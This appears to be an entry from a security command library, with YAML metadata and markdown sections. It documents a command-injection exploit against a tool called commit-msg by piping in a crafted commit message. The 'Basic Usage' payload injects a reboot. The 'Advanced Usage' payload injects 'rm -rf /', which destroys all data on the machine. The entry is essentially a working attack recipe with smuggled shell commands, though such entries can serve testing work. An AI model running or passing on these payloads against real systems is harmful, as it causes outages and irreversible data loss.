---
id: cmd-uuid-3
data: echo "test||reboot" | commit-msg stdin
tags:
  - rce
  - injection
type: command
output: 'Executes the injected ''reboot'' command, rebooting the machine'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.274Z'
verified: false
validated: true
submitted: true
---
# echo-malicious-payload

## Command

```bash
echo "test||reboot" | commit-msg stdin
```

## Description

Pipes a malicious commit message payload to commit-msg via stdin, exploiting the RCE by injecting shell commands.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `stdin` | Input mode for commit-msg | Yes |
| `test||reboot` | Payload with command injection | Yes |

## Examples

### Basic Usage

```bash
echo "test||reboot" | commit-msg stdin
```

### Advanced Usage

```bash
echo "benign; rm -rf /" | commit-msg stdin
```

## Expected Output

Injected command executes; system may reboot or show effects.

## Related

- [[commands/node-run-poc]]
- [[procedures/Exploit-RCE-with-Malicious-Commit-Input]]
